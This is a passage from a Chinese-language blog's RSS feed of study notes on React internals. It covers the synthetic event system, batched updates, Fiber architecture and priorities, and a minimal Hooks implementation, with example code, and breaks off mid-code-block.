iv></div><div><pre><code><span>/** @jsxRuntime classic @jsx Didact.createElement */</span>
<span>import</span> Didact <span>from</span> <span>'./Didact.js'</span>

<span>function</span> <span>Counter</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> <span>[</span>state<span>,</span> setState<span>]</span> <span>=</span> Didact<span>.</span><span>useState</span><span>(</span><span>1</span><span>)</span>
  <span>return</span> <span><span><span>&lt;</span>h1</span> <span>onClick</span><span><span>=</span><span>{</span><span>(</span><span>)</span> <span>=></span> <span>setState</span><span>(</span><span>c</span> <span>=></span> c <span>+</span> <span>1</span><span>)</span><span>}</span></span><span>></span></span><span>Count: </span><span>{</span>state<span>}</span><span><span><span>&lt;/</span>h1</span><span>></span></span>
<span>}</span>
<span>const</span> element <span>=</span> <span><span><span>&lt;</span><span>Counter</span></span> <span>/></span></span>
<span>const</span> container <span>=</span> document<span>.</span><span>getElementById</span><span>(</span><span>'root'</span><span>)</span>
Didact<span>.</span><span>render</span><span>(</span>element<span>,</span> container<span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><ul>
<li><a href="https://pomb.us/build-your-own-react/" target="_blank" rel="noopener noreferrer">Build your own React - pomb</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>React</title>
      <link>https://www.matrixtheone.ga/web/memo/React/</link>
      <guid>https://www.matrixtheone.ga/web/memo/React/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">React</source>
      <category>React</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-宏观包结构"> 1. 宏观包结构</h2>
<img :src="$withBase('/images/React/核心包关系图.png')" loading="lazy">
<ul>
<li><a href="https://7kms.github.io/react-illustration-series/main/macro-structure" target="_blank" rel="noopener noreferrer">图解 React / 宏观包结构 - 图解 React</a></li>
</ul>
<h2 id="_2-事件机制"> 2. 事件机制</h2>
<ul>
<li>
<p>为了解决跨浏览器的兼容性问题，SyntheticEvent 实例将被传递给你的事件处理函数，SyntheticEvent 是 React 跨浏览器的浏览器原生事件包装器，它还拥有和浏览器原生事件相同的接口，包括 stopPropagation() 和 preventDefault()。</p>
<blockquote>
<ol>
<li>监听原生事件：对齐 DOM 元素和 fiber 元素。</li>
<li>收集 listeners：遍历 fiber 树，收集所有监听本事件 listener 函数。</li>
<li>派发合成事件：构造合成事件，遍历 listeners 进行派发。</li>
</ol>
</blockquote>
</li>
<li>
<p>React 实际上并不将事件附加到子节点本身。React 使用单个事件侦听器侦听顶层的所有事件。这对性能有好处，也意味着 React 在更新 DOM 时不需要跟踪事件监听器。</p>
</li>
<li>
<p>React 16 <a href="https://juejin.cn/post/6909271104440205326" target="_blank" rel="noopener noreferrer">React 事件系统工作原理 - 网易云音乐大前端团队</a></p>
<blockquote>
<ol>
<li>React 将所有事件类型都注册到 document 上。</li>
<li>所有原生事件的 listener 都是 dispatchEvent 函数。</li>
<li>同一个类型的事件 React 只会绑定一次原生事件，例如无论我们写了多少个 onClick，最终反应在 DOM 事件上只会有一个 click listener（采用 Set 数据结构存储判断）。</li>
<li>React 并没有将我们业务逻辑里的 listener 绑在原生事件上，也没有去维护一个类似 eventlistenermap 的东西存放我们的 listener。</li>
</ol>
</blockquote>
</li>
<li>
<p>React 16 及更早版本，合成事件对象的事件处理函数全部被调用之后，所有属性都会被置为 null。这时，如果我们需要在事件处理函数运行之后获取事件对象的属性，可以使用 React 提供的 e.persist() 方法，保留所有属性。</p>
<blockquote>
<p>React 17 不使用事件池，不会存在 “所有属性都会被置为 null” 的问题。</p>
</blockquote>
<div><pre><code><span>const</span> <span>handleChange</span> <span>=</span> <span>e</span> <span>=></span> <span>{</span>
  <span>// e.persist()</span>
  console<span>.</span><span>log</span><span>(</span>e<span>.</span>target<span>)</span> <span>// button</span>
  <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>e<span>.</span>target<span>)</span><span>,</span> <span>100</span><span>)</span> <span>// null</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div></li>
<li>
<p>类组件：事件触发过程中，dispatchEvent 调用了 invokeGuardedCallback 方法。回调函数是直接调用的，并没有指定调用的组件，所以不进行手动绑定的情况下直接获取到的 this 是 undefined。</p>
</li>
<li>
<p>批量更新与同步更新。</p>
<p><font color="#12aa9c">批量更新：</font></p>
<blockquote>
<ul>
<li>在 React Legacy 模式中，经过 batchedUpdates 执行的调度会开启批量更新（<a href="https://github.com/facebook/react/blob/v17.0.2/packages/react-reconciler/src/ReactFiberWorkLoop.new.js#L528-L630" target="_blank" rel="noopener noreferrer">scheduleUpdateOnFiber</a>、<a href="https://github.com/facebook/react/blob/v17.0.2/packages/react-reconciler/src/ReactFiberWorkLoop.new.js#L1128-L1141" target="_blank" rel="noopener noreferrer">batchedUpdates</a>）。</li>
<li>React 管控合成事件的回调函数（onClick、onFocus 等）默认经过 batchedUpdates 函数执行。</li>
<li>react-dom 包中导出了 batchedUpdates 函数（取别名为 unstable_batchedUpdates），开发者可以通过此函数开启批量更新（<a href="https://github.com/facebook/react/blob/v17.0.2/packages/react-dom/src/client/ReactDOM.js#L193" target="_blank" rel="noopener noreferrer">packages/react-dom/src/client/ReactDOM</a>）。</li>
<li>Blocking 和 Concurrent 模式均为批量更新。</li>
</ul>
</blockquote>
<div><pre><code><span>// 更新调度</span>
<span>export</span> <span>function</span> <span>scheduleUpdateOnFiber</span><span>(</span><span>)</span> <span>{</span>
  <span>// ...</span>

  <span>if</span> <span>(</span>lane <span>===</span> SyncLane<span>)</span> <span>{</span>
    <span>// Legacy 模式</span>

    <span>if</span> <span>(</span>omit<span>)</span> <span>{</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>// 批量更新</span>
      <span>ensureRootIsScheduled</span><span>(</span>root<span>,</span> eventTime<span>)</span>
      <span>schedulePendingInteractions</span><span>(</span>root<span>,</span> lane<span>)</span>
      <span>// 执行上下文为空时进行同步更新</span>
      <span>if</span> <span>(</span>executionContext <span>===</span> NoContext<span>)</span> <span>{</span>
        <span>// 同步更新</span>
        <span>resetRenderTimer</span><span>(</span><span>)</span>
        <span>flushSyncCallbackQueue</span><span>(</span><span>)</span>
      <span>}</span>
    <span>}</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>// 并发模式（Blocking | Concurrent）</span>

    <span>// ...</span>

    <span>// 批量更新</span>
    <span>ensureRootIsScheduled</span><span>(</span>root<span>,</span> eventTime<span>)</span>
    <span>schedulePendingInteractions</span><span>(</span>root<span>,</span> lane<span>)</span>
  <span>}</span>
  <span>// ...</span>
<span>}</span>

<span>// 批处理函数</span>
<span>export</span> <span>function</span> <span>batchedUpdates</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> prevExecutionContext <span>=</span> executionContext
  executionContext <span>|=</span> BatchedContext <span>// 位掩码方式增加 BatchedContext</span>
  <span>try</span> <span>{</span>
    <span>// 此时，执行 scheduleUpdateOnFiber 的 executionContext !== NoContext</span>
    <span>return</span> <span>fn</span><span>(</span>a<span>)</span>
  <span>}</span> <span>finally</span> <span>{</span>
    executionContext <span>=</span> prevExecutionContext
    <span>if</span> <span>(</span>executionContext <span>===</span> NoContext<span>)</span> <span>{</span>
      <span>// Flush the immediate callbacks that were scheduled during this batch</span>
      <span>resetRenderTimer</span><span>(</span><span>)</span>
      <span>flushSyncCallbackQueue</span><span>(</span><span>)</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br></div></div><p><font color="#12aa9c">同步更新：</font></p>
<blockquote>
<ul>
<li>在 React Legacy 模式中，非 React 管控的事件的回调函数（addEventListener、Promise、MessageChannel、setTimeout）不经过 batchedUpdates 函数执行，也就是同步更新。</li>
</ul>
</blockquote>
</li>
<li>
<p>React 会在派发事件时打开批量更新，此时 1、2 在合成事件内，只会触发一次 render。setTimeout 为异步任务，此时 3、4 是同步的，均会触发一次 render。</p>
<blockquote>
<p>类组件打印顺序：0 -&gt; 0 -&gt; render -&gt; flushSync -&gt; render -&gt; 3 -&gt; render -&gt; 4 -&gt; batched -&gt; 4 -&gt; 4 -&gt; render</p>
</blockquote>
<div><pre><code><span>import</span> React<span>,</span> <span>{</span> Component <span>}</span> <span>from</span> <span>'react'</span>
<span>import</span> <span>{</span> unstable_batchedUpdates <span>}</span> <span>from</span> <span>'react-dom'</span>

<span>class</span> <span>App</span> <span>extends</span> <span>Component</span> <span>{</span>
  state <span>=</span> <span>{</span>
    <span>num</span><span>:</span> <span>0</span><span>,</span>
  <span>}</span>

  <span>handleChange</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>const</span> setState <span>=</span> <span>this</span><span>.</span><span>setState</span><span>.</span><span>bind</span><span>(</span><span>this</span><span>)</span>
    <span>setState</span><span>(</span><span>{</span> <span>num</span><span>:</span> <span>1</span> <span>}</span><span>)</span>
    console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>state<span>.</span>num<span>)</span> <span>// 0</span>
    <span>setState</span><span>(</span><span>{</span> <span>num</span><span>:</span> <span>2</span> <span>}</span><span>)</span>
    console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>state<span>.</span>num<span>)</span> <span>// 0</span>

    <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span><span>'flushSync'</span><span>)</span>
      <span>setState</span><span>(</span><span>{</span> <span>num</span><span>:</span> <span>3</span> <span>}</span><span>)</span>
      console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>state<span>.</span>num<span>)</span> <span>// 3</span>
      <span>setState</span><span>(</span><span>{</span> <span>num</span><span>:</span> <span>4</span> <span>}</span><span>)</span>
      console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>state<span>.</span>num<span>)</span> <span>// 4</span>
    <span>}</span><span>)</span>

    <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>unstable_batchedUpdates</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
        console<span>.</span><span>log</span><span>(</span><span>'batched'</span><span>)</span>
        <span>setState</span><span>(</span><span>{</span> <span>num</span><span>:</span> <span>5</span> <span>}</span><span>)</span>
        console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>state<span>.</span>num<span>)</span> <span>// 4</span>
        <span>setState</span><span>(</span><span>{</span> <span>num</span><span>:</span> <span>6</span> <span>}</span><span>)</span>
        console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>state<span>.</span>num<span>)</span> <span>// 4</span>
      <span>}</span><span>)</span>
    <span>}</span><span>)</span>
  <span>}</span>

  <span>render</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'render'</span><span>)</span>
    <span>return</span> <span>(</span>
      <span><span><span>&lt;</span></span><span>></span></span><span>
        </span><span><span><span>&lt;</span>button</span> <span>onClick</span><span><span>=</span><span>{</span><span>this</span><span>.</span>handleChange<span>}</span></span><span>></span></span><span>button</span><span><span><span>&lt;/</span>button</span><span>></span></span><span>
      </span><span><span><span>&lt;/</span></span><span>></span></span>
    <span>)</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br></div></div><blockquote>
<ul>
<li>函数组件打印顺序：0 -&gt; 0 -&gt; render -&gt; flushSync -&gt; render -&gt; 0 -&gt; render -&gt; 0 -&gt; batched -&gt; 0 -&gt; 0 -&gt; render</li>
<li>Hooks 闭包原因，不能在 setTimeout 获取到 num 最新的值</li>
</ul>
</blockquote>
<div><pre><code><span>import</span> React<span>,</span> <span>{</span> useState <span>}</span> <span>from</span> <span>'react'</span>
<span>import</span> <span>{</span> unstable_batchedUpdates <span>}</span> <span>from</span> <span>'react-dom'</span>

<span>const</span> <span>App</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>const</span> <span>[</span>num<span>,</span> setNum<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>0</span><span>)</span>

  <span>const</span> <span>handleChange</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>setNum</span><span>(</span><span>1</span><span>)</span>
    console<span>.</span><span>log</span><span>(</span>num<span>)</span> <span>// 0</span>
    <span>setNum</span><span>(</span><span>2</span><span>)</span>
    console<span>.</span><span>log</span><span>(</span>num<span>)</span> <span>// 0</span>

    <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span><span>'flushSync'</span><span>)</span>
      <span>setNum</span><span>(</span><span>3</span><span>)</span>
      console<span>.</span><span>log</span><span>(</span>num<span>)</span> <span>// 0</span>
      <span>setNum</span><span>(</span><span>4</span><span>)</span>
      console<span>.</span><span>log</span><span>(</span>num<span>)</span> <span>// 0</span>
    <span>}</span><span>)</span>

    <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>unstable_batchedUpdates</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
        console<span>.</span><span>log</span><span>(</span><span>'batched'</span><span>)</span>
        <span>setNum</span><span>(</span><span>5</span><span>)</span>
        console<span>.</span><span>log</span><span>(</span>num<span>)</span> <span>// 0</span>
        <span>setNum</span><span>(</span><span>6</span><span>)</span>
        console<span>.</span><span>log</span><span>(</span>num<span>)</span> <span>// 0</span>
      <span>}</span><span>)</span>
    <span>}</span><span>)</span>
  <span>}</span>

  console<span>.</span><span>log</span><span>(</span><span>'render'</span><span>)</span>

  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span></span><span>></span></span><span>
      </span><span><span><span>&lt;</span>button</span> <span>onClick</span><span><span>=</span><span>{</span>handleChange<span>}</span></span><span>></span></span><span>button</span><span><span><span>&lt;/</span>button</span><span>></span></span><span>
    </span><span><span><span>&lt;/</span></span><span>></span></span>
  <span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br></div></div></li>
<li>
<p>React 17 事件系统新特性。</p>
<blockquote>
<ol>
<li>React 将不再向 document 附加事件处理器。而会将事件处理器附加到渲染 React 树的根 DOM 容器中<code>ReactDOM.render(&lt;App /&gt;, rootNode);</code>。将顶层事件绑定在 rootNode 上而不是 document 上能够解决我们遇到的多版本共存问题，对微前端方案是个重大利好。</li>
<li>支持了原生捕获事件的支持，对齐了浏览器原生标准，同时 onScroll 事件不再进行事件冒泡。</li>
<li>取消事件复用。</li>
</ol>
</blockquote>
<img :src="$withBase('/images/React/react_17_delegation.png')" loading="lazy">
</li>
<li>
<p>在 processDispatchQueueItemsInOrder 函数中，根据捕获（capture）或冒泡（bubble）的不同，采取了不同的遍历方式（<a href="https://github.com/facebook/react/blob/v17.0.2/packages/react-dom/src/events/DOMPluginEventSystem.js#L233-L258" target="_blank" rel="noopener noreferrer">packages/react-dom/src/events/DOMPluginEventSystem</a>）。</p>
<blockquote>
<ul>
<li>capture 事件：从上至下调（由外向里）用 fiber 树中绑定的回调函数，所以倒序遍历 dispatchListeners。</li>
<li>bubble 事件：从下至上调（由里向外）用 fiber 树中绑定的回调函数，所以顺序遍历 dispatchListeners。</li>
</ul>
</blockquote>
</li>
<li>
<p>事件触发顺序。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>17 版本之前</th>
<th>17 版本</th>
</tr>
</thead>
<tbody>
<tr>
<td>html 捕获</td>
<td>父元素 React 事件捕获</td>
</tr>
<tr>
<td>父元素原生捕获</td>
<td>子元素 React 事件捕获</td>
</tr>
<tr>
<td>子元素原生捕获</td>
<td>root 捕获</td>
</tr>
<tr>
<td>子元素原生冒泡</td>
<td>父元素原生捕获</td>
</tr>
<tr>
<td>父元素原生冒泡</td>
<td>子元素原生捕获</td>
</tr>
<tr>
<td>html 冒泡</td>
<td>子元素原生冒泡</td>
</tr>
<tr>
<td>父元素 React 事件捕获</td>
<td>父元素原生冒泡</td>
</tr>
<tr>
<td>子元素 React 事件捕获</td>
<td>子元素 React 事件冒泡</td>
</tr>
<tr>
<td>子元素 React 事件冒泡</td>
<td>父元素 React 事件冒泡</td>
</tr>
<tr>
<td>父元素 React 事件冒泡</td>
<td>root 冒泡</td>
</tr>
</tbody>
</table>
<ul>
<li><a href="https://7kms.github.io/react-illustration-series/main/synthetic-event" target="_blank" rel="noopener noreferrer">图解 React / React 合成事件 - 图解 React</a></li>
</ul>
<h2 id="_3-fiber-架构"> 3. Fiber 架构</h2>
<ul>
<li>
<p>Fiber 是对 React 核心算法的重构，facebook 团队使用两年多的时间去重构 React 的核心算法，在 React 16 以上的版本中引入了 Fiber 架构。</p>
</li>
<li>
<p>React 15 架构可以分为两层：</p>
<blockquote>
<ul>
<li>Reconciler（协调器）- 负责找出变化的组件</li>
<li>Renderer（渲染器）- 负责将变化的组件渲染到页面上</li>
</ul>
</blockquote>
</li>
<li>
<p>React 16 架构可以分为三层：</p>
<blockquote>
<ul>
<li>Scheduler（调度器）- 调度任务的优先级，高优任务优先进入 Reconciler</li>
<li>Reconciler（协调器）- 负责找出变化的组件</li>
<li>Renderer（渲染器）- 负责将变化的组件渲染到页面上</li>
</ul>
</blockquote>
</li>
<li>
<p>React 15 中 Reconciler 是递归处理虚拟 DOM 的，递归过程是不能中断的。如果组件树的层级很深，递归会占用线程很多时间，造成卡顿。</p>
</li>
<li>
<p>React 16 使用双缓存 Fiber 树（链表结构）处理虚拟 DOM，调度的过程可以被中断，将控制权交回浏览器，让位给高优先级的任务，浏览器空闲后再恢复调度。让 React 的更新过程变得可控，避免了之前一竿子递归到底影响性能的做法（渲染可中断需开启 Concurrent 模式）。</p>
<blockquote>
<ol>
<li>为每个任务增加了优先级，优先级高的任务可以中断低优先级的任务。然后再重新执行优先级低的任务。</li>
<li>增加了异步任务，调用 requestIdleCallback（React 使用自我实现的 requestIdleCallbackpolyfill —— Scheduler），浏览器空闲的时候执行。</li>
<li>dom diff 树变成了链表，一个 dom 对应两个 fiber，对应两个队列，是为找到被中断的任务，重新执行。</li>
</ol>
</blockquote>
</li>
<li>
<p>任务优先级：为了避免任务被饿死，可以设置一个超时时间。这个超时时间不是死的，低优先级的可以慢慢等待，高优先级的任务应该率先被执行。目前 React 预定义了 5 个优先级。</p>
<blockquote>
<ol>
<li>Immediate（-1）这个优先级的任务会同步执行，或者说要马上执行且不能中断。</li>
<li>UserBlocking（250ms）这些任务一般是用户交互的结果，需要即时得到反馈。</li>
<li>Normal（5s）应对哪些不需要立即感受到的任务，例如网络请求。</li>
<li>Low（10s）这些任务可以放后，但是最终应该得到执行。例如分析通知。</li>
<li>Idle（没有超时时间）一些没有必要做的任务（e.g. 比如隐藏的内容），可能会被饿死。</li>
</ol>
</blockquote>
</li>
<li>
<p>Fiber 两阶段：</p>
<p><font color="#12aa9c">协调阶段（fiber 树构造）：</font>可以认为是 Diff 阶段，这个阶段可以被中断，会找出所有节点变更，例如节点新增、删除、属性变更等等，这些变更 React 称之为 <strong>副作用(Effect)</strong>。以下生命周期钩子会在协调阶段被调用：</p>
<blockquote>
<ol>
<li>constructor</li>
<li>componentWillMount（废弃）</li>
<li>componentWillReceiveProps（废弃）</li>
<li>static getDerivedStateFromProps</li>
<li>shouldComponentUpdate</li>
<li>componentWillUpdate（废弃）</li>
<li>render</li>
</ol>
</blockquote>
<p><font color="#12aa9c">提交阶段（fiber 树渲染）：</font>将上一个阶段计算出来的需要处理的 <strong>副作用(Effects)</strong> 一次性执行了。Legacy 模式下这个阶段必须同步执行，不能被打断。这些生命周期钩子在提交阶段被执行：</p>
<blockquote>
<ol>
<li>getSnapshotBeforeUpdate（严格来说，这个是在进入 commit 阶段前调用）</li>
<li>componentDidMount</li>
<li>componentDidUpdate</li>
<li>componentWillUnmount</li>
</ol>
</blockquote>
</li>
<li>
<p><a href="https://juejin.cn/post/6844903975112671239" target="_blank" rel="noopener noreferrer">最通俗的 React Fiber(时间分片) 打开方式 - 荒山</a></p>
</li>
<li>
<p><a href="https://react.iamkasong.com/" target="_blank" rel="noopener noreferrer">React 技术揭秘 - 卡颂</a></p>
</li>
<li>
<p><a href="https://7kms.github.io/react-illustration-series/" target="_blank" rel="noopener noreferrer">图解 React - 图解 React</a></p>
</li>
</ul>
<h2 id="_4-hooks"> 4. Hooks</h2>
<ul>
<li>
<p>代数效应是函数式编程中的一个概念，用于将副作用从函数调用中分离。不需要关注 Hooks 怎么存储状态，只需按正常结果编写业务逻辑。</p>
<blockquote>
<ul>
<li><a href="https://overreacted.io/zh-hans/algebraic-effects-for-the-rest-of-us/" target="_blank" rel="noopener noreferrer">通俗易懂的代数效应 - Dan</a></li>
<li><a href="https://react.iamkasong.com/process/fiber-mental.html" target="_blank" rel="noopener noreferrer">Fiber 架构的心智模型 - React 技术揭秘</a></li>
<li><a href="https://codesandbox.io/s/frosty-hermann-bztrp?file=/src/index.js" target="_blank" rel="noopener noreferrer">Suspense Demo</a></li>
</ul>
</blockquote>
<div><pre><code><span>// 假设语法</span>
<span>function</span> <span>getName</span><span>(</span><span>user</span><span>)</span> <span>{</span>
  <span>let</span> name <span>=</span> user<span>.</span>name<span>;</span>
  <span>if</span> <span>(</span>name <span>===</span> <span>null</span><span>)</span> <span>{</span>
    name <span>=</span> perform <span>'ask_name'</span><span>;</span>
  <span>}</span>
  <span>return</span> name<span>;</span>
<span>}</span>

<span>function</span> <span>makeFriends</span><span>(</span><span>user1<span>,</span> user2</span><span>)</span> <span>{</span>
  user1<span>.</span>friendNames<span>.</span><span>add</span><span>(</span><span>getName</span><span>(</span>user2<span>)</span><span>)</span><span>;</span>
  user2<span>.</span>friendNames<span>.</span><span>add</span><span>(</span><span>getName</span><span>(</span>user1<span>)</span><span>)</span><span>;</span>
<span>}</span>

<span>const</span> arya <span>=</span> <span>{</span> <span>name</span><span>:</span> <span>null</span> <span>}</span><span>;</span>
<span>const</span> gendry <span>=</span> <span>{</span> <span>name</span><span>:</span> <span>'Gendry'</span> <span>}</span><span>;</span>
<span>try</span> <span>{</span>
  <span>makeFriends</span><span>(</span>arya<span>,</span> gendry<span>)</span><span>;</span>
<span>}</span> <span>handle</span> <span>(</span><span>effect</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>effect <span>===</span> <span>'ask_name'</span><span>)</span> <span>{</span>
    <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
      resume <span>with</span> <span>'Arya Stark'</span><span>;</span>
    <span>}</span><span>,</span> <span>1000</span><span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div></li>
<li>
<p><a href="https://react.iamkasong.com/hooks/create.html" target="_blank" rel="noopener noreferrer">极简 Hooks 实现 - React 技术揭秘</a></p>
<div><pre><code><span>let</span> workInProgressHook <span>// 当前工作的 Hook</span>
<span>let</span> isMount <span>=</span> <span>true</span> <span>// true 代表首次挂载</span>

<span>// App 组件对应的 fiber</span>
<span>const</span> fiber <span>=</span> <span>{</span>
  <span>memoizedState</span><span>:</span> <span>null</span><span>,</span> <span>// Hooks 链表</span>
  <span>stateNode</span><span>:</span> App<span>,</span> <span>// render</span>
<span>}</span>

<span>// 调度更新</span>
<span>function</span> <span>schedule</span><span>(</span><span>)</span> <span>{</span>
  <span>// 更新前将 workInProgressHook 重置为第一个 Hook</span>
  workInProgressHook <span>=</span> fiber<span>.</span>memoizedState
  <span>// render</span>
  <span>const</span> app <span>=</span> fiber<span>.</span><span>stateNode</span><span>(</span><span>)</span>
  isMount <span>=</span> <span>false</span>
  <span>return</span> app
<span>}</span>

<span>// 更新 Hook（updateNum）</span>
<span>function</span> <span>dispatchAction</span><span>(</span><span>queue<span>,</span> action</span><span>)</span> <span>{</span>
  <span>// 更新队列：环状单向链表（方便取第一个元素和添加元素）</span>
  <span>const</span> update <span>=</span> <span>{</span>
    action<span>,</span> <span>// updateNum 回调</span>
    <span>next</span><span>:</span> <span>null</span><span>,</span> <span>// 下个 update</span>
  <span>}</span>
  <span>// 创建 update 单向环状链表</span>
  <span>// queue.pending 为最后一个添加的元素，queue.pending.next 为第一个添加的元素</span>
  <span>if</span> <span>(</span>queue<span>.</span>pending <span>===</span> <span>null</span><span>)</span> <span>{</span>
    update<span>.</span>next <span>=</span> update
  <span>}</span> <span>else</span> <span>{</span>
    update<span>.</span>next <span>=</span> queue<span>.</span>pending<span>.</span>next
    queue<span>.</span>pending<span>.</span>next <span>=</span> update
  <span>}</span>
  queue<span>.</span>pending <span>=</span> update

  <span>schedule</span><span>(</span><span>)</span>
<span>}</span>

<span>function</span> <span>useState</span><span>(</span><span>initialState</span><span>)</span> <span>{</span>
  <span>let</span> hook

  <span>if</span> <span>(</span>isMount<span>)</span> <span>{</span>
    <span>// 首次挂载</span>
    hook <span>=</span> <span>{</span>
      <span>// 更新队列</span>
      <span>queue</span><span>:</span> <span>{</span>
        <span>pending</span><span>:</span> <span>null</span><span>,</span>
      <span>}</span><span>,</span>
      <span>memoizedState</span><span>:</span> initialState<span>,</span> <span>// Hook 当前状态（num）</span>
      <span>next</span><span>:</span> <span>null</span><span>,</span> <span>// 下个 Hook</span>
    <span>}</span>
    <span>// 创建 Hooks 单向链表</span>
    <span>if</span> <span>(</span><span>!</span>fiber<span>.</span>memoizedState<span>)</span> <span>{</span>
      fiber<span>.</span>memoizedState <span>=</span> hook
    <span>}</span> <span>else</span> <span>{</span>
      workInProgressHook<span>.</span>next <span>=</span> hook
    <span>}</span>
    workInProgressHook <span>=</span> hook
  <span>}</span> <span>else</span> <span>{</span>
    <span>// 更新</span>
    hook <span>=</span> workInProgressHook
    workInProgressHook <span>=</span> workInProgressHook<span>.</span>next <span>// 移动到下一个 Hook</span>
  <span>}</span>

  <span>let</span> baseState <span>=</span> hook<span>.</span>memoizedState <span>// 保存更新前状态</span>
  <span>// 判断当前 Hook 更新队列是否为空</span>
  <span>if</span> <span>(</span>hook<span>.</span>queue<span>.</span>pending<span>)</span> <span>{</span>
    <span>let</span> firstUpdate <span>=</span> hook<span>.</span>queue<span>.</span>pending<span>.</span>next

    <span>// 执行更新队列函数，获取最后的 Hook 状态</span>
    <span>do</span> <span>{</span>
      <span>const</span> action <span>=</span> firstUpdate<span>.</span>action
      baseState <span>=</span> <span>action</span><span>(</span>baseState<span>)</span>
      firstUpdate <span>=</span> firstUpdate<span>.</span>next
    <span>}</span> <span>while</span> <span>(</span>firstUpdate <span>!==</span> hook<span>.</span>queue<span>.</span>pending<span>)</span>

    <span>// 清空更新队列</span>
    hook<span>.</span>queue<span>.</span>pending <span>=</span> <span>null</span>
  <span>}</span>
  <span>// 更新 Hook 当前状态</span>
  hook<span>.</span>memoizedState <span>=</span> baseState

  <span>return</span> <span>[</span>baseState<span>,</span> <span>dispatchAction</span><span>.</span><span>bind</span><span>(</span><span>null</span><span>,</span> hook<span>.</span>queue<span>)</span><span>]</span>
<span>}</span>

<span>function</span> <span>App</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> <span>[</span>num<span>,</span> updateNum<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>0</span><span>)</span>

